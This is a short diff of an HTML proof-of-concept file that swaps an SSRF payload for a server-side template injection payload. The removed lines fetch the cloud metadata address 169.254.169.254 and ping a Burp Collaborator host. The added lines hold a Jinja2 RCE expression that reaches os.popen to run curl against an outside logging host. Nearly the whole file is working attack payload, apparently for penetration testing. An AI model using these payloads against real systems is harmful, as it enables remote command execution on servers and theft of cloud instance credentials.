@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>SSRF PoC</title>
+  <title>SSTI Payload</title>
 </head>
 <body>
-  <h1>Triggering internal fetch...</h1>
-  <img src="http://169.254.169.254/latest/meta-data/hostname">
-  <img src="http://burp-collaborator.yourdomain.com">
+  <h1>Test</h1>
+  <p>Eval check: {{7*7}}</p>
+  <p>RCE: {{ config.__class__.__init__.__globals__['os'].popen('curl https://log.mzero.cloud/rce-check').read() }}</p>
 </body>
 </html>
+
